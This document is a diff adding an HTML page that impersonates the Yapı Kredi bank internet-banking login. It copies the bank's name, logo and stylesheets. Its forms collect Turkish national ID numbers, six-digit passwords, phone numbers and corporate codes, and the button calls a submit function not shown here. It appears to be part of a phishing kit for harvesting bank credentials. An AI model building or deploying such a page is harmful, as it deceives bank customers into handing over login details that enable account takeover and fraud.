@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YAPI KREDİ</title>
+    <link rel="stylesheet" href="https://https://internetsube.yapikredi.com.tr//ngi-static/css/source/fonts.css">
+    <link rel="stylesheet" href="https://https://internetsube.yapikredi.com.tr//ngi-static/css/main.ui.min.css">
+    <link rel="stylesheet" href="main.css">
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background: #ffffff; /* Arka plan tamamen beyaz */
+            color: #000; /* Yazılar siyah */
+        }
+        .container {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        .tab {
+            padding: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: color 0.3s, border-bottom 0.3s;
+        }
+        .tab.active {
+            font-weight: bold;
+            border-bottom: 2px solid;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+        .toggle {
+            position: relative;
+            width: 40px;
+            height: 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            background-color: #ddd;
+            transition: background-color 0.3s;
+        }
+        .toggle::before {
+            content: "";
+            position: absolute;
+            top: 1px;
+            left: 2px;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background-color: #fff;
+            transition: 0.3s;
+        }
+        .toggle.active {
+            background-color: #0072ce;
+        }
+        .toggle.active::before {
+            left: 20px;
+        }
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #0072ce;
+            color: #fff;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="./logo.png" alt="Yapı Kredi Logo">
+        </div>
+
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('individual')">Bireysel</div>
+            <div class="tab" onclick="switchTab('corporate')">Kurumsal</div>
+        </div>
+
+        <div id="individual" class="tab-content">
+            <div class="input-group">
+                <input type="text" id="tc-kimlik" placeholder="T.C. Kimlik No veya Kullanıcı Kodu" maxlength="11">
+            </div>
+            <div class="input-group">
+                <input type="password" id="sifre" placeholder="Şifre" maxlength="6">
+            </div>
+            <div class="input-group">
+                <input type="text" id="telefon" placeholder="Telefon Numarası" maxlength="12">
+            </div>
+        </div>
+
+        <div id="corporate" class="tab-content hidden">
+            <div class="input-group">
+                <input type="text" id="kurumsal-kod" placeholder="Kurumsal Kod" maxlength="10">
+            </div>
+            <div class="input-group">
+                <input type="password" id="kurumsal-sifre" placeholder="Kurumsal Şifre" maxlength="6">
+            </div>
+        </div>
+
+        <div class="remember-me">
+            <span>Beni Hatırla</span>
+            <div class="toggle" onclick="this.classList.toggle('active')"></div>
+        </div>
+
+        <button class="login-button" onclick="validateAndSubmit()">Giriş</button>
+
+        <a href="#" class="forgot-password">Şifre Al / Şifremi Unuttum</a>
+    </div>
+
+    <script>
+        function switchTab(tab) {
+            const individualContent = document.getElementById('individual');
+            const corporateContent = document.getElementById('corporate');
+            const tabs = document.querySelectorAll('.tab');
+
+            if (tab === 'individual') {
+                individualContent.classList.remove('hidden');
+                corporateContent.classList.add('hidden');
+            } else {
+                individualContent.classList.add('hidden');
+                corporateContent.classList.remove('hidden');
+            }
+
+            tabs.forEach(t => t.classList.remove('active'));
+            document.querySelector(`.tab:nth-child(${tab === 'individual' ? 1 : 2})`).classList.add('active');
+        }
+    </script>
+</body>
+
+</html>
